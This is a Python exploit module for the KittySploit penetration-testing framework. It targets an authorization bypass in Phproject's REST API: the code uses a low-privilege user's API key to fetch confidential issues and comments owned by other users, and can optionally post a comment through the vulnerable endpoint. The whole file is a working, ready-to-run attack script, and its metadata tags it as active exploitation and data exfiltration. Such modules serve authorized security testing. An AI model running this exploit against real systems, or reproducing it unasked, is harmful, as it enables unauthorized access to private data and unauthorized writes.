#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-104991 — Phproject REST issue read/comment BOLA."""

from __future__ import annotations

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Phproject CVE-2026-104991 REST issue IDOR",
        "description": (
            "CVE-2026-104991 (Phproject <= 1.8.6): with security.restrict_access enabled, "
            "GET /issues/@id.json, GET/POST /issues/@id/comments.json skip allowAccess() "
            "while the web UI enforces ownership. Requires a low-privilege user API key and "
            "a confidential issue ID owned by another user."
        ),
        "author": ["Alisher Qarshibayev", "KittySploit Team"],
        "cve": ["CVE-2026-104991"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-104991",
            "https://github.com/wvllxe/CVE-2026-104991",
        ],
        "tags": ["phproject", "idor", "bola", "api", "cve-2026-104991"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "requires": {
                "endpoint_pattern_any": ["/issues/", ".json"],
                "auth_session": True,
            },
            "chain": {
                "suggested_followups": [
                    "scanner/http/phproject_cve_2026_104991_detect",
                ],
            },
        },
    }

    port = OptPort(80, "Phproject HTTP port", required=False)
    ssl = OptBool(False, "Use HTTPS", required=False, advanced=True)
    issue_id = OptInteger(1, "Target issue ID (confidential, other owner)", required=True)
    api_key = OptString("", "Low-privilege user API key (?key=)", required=True)
    post_comment = OptBool(
        False,
        "POST a marker comment via the vulnerable comments endpoint",
        required=False,
    )
    comment_text = OptString(
        "KittySploit CVE-2026-104991 authorization test",
        "Comment body when post_comment is true",
        required=False,
    )

    def _key_param(self) -> dict:
        key = str(self.api_key or "").strip()
        return {"key": key} if key else {}

    def run(self):
        issue_id = int(self.issue_id or 0)
        if issue_id <= 0:
            print_error("issue_id must be positive")
            return False
        if not str(self.api_key or "").strip():
            print_error("api_key is required")
            return False

        web_path = f"/issues/{issue_id}"
        web_resp = self.http_request(method="GET", path=web_path, allow_redirects=True)
        web_status = int(web_resp.status_code or 0) if web_resp else 0
        print_info(f"Web GET {web_path} -> HTTP {web_status}")

        api_issue_path = f"/issues/{issue_id}.json"
        api_resp = self.http_request(
            method="GET",
            path=api_issue_path,
            params=self._key_param(),
            allow_redirects=False,
        )
        if not api_resp:
            print_error("No API issue response")
            return False
        api_status = int(api_resp.status_code or 0)
        print_info(f"API GET {api_issue_path} -> HTTP {api_status}")

        comments_path = f"/issues/{issue_id}/comments.json"
        comments_resp = self.http_request(
            method="GET",
            path=comments_path,
            params=self._key_param(),
            allow_redirects=False,
        )
        comments_status = int(comments_resp.status_code or 0) if comments_resp else 0
        print_info(f"API GET {comments_path} -> HTTP {comments_status}")

        bypass = web_status in (403, 404) and api_status == 200
        if api_status == 200:
            try:
                data = json.loads(api_resp.text or "{}")
                issue = data.get("issue") or data
                title = issue.get("name") or issue.get("title") or ""
                if title:
                    print_success(f"Issue title via API: {title[:120]}")
            except json.JSONDecodeError:
                print_warning("API returned non-JSON body")

        if comments_status == 200 and comments_resp:
            print_success("Comments JSON returned for restricted issue")

        if self.post_comment:
            post_resp = self.http_request(
                method="POST",
                path=comments_path,
                params=self._key_param(),
                data={"text": str(self.comment_text or "").strip() or "test"},
                allow_redirects=False,
            )
            post_status = int(post_resp.status_code or 0) if post_resp else 0
            print_info(f"API POST {comments_path} -> HTTP {post_status}")
            if post_status == 200:
                bypass = True

        if bypass:
            print_success(
                "Authorization gap: web denied access while REST API returned 200"
            )
            return True

        print_error("IDOR pattern not observed (check issue_id, api_key, restrict_access)")
        return False
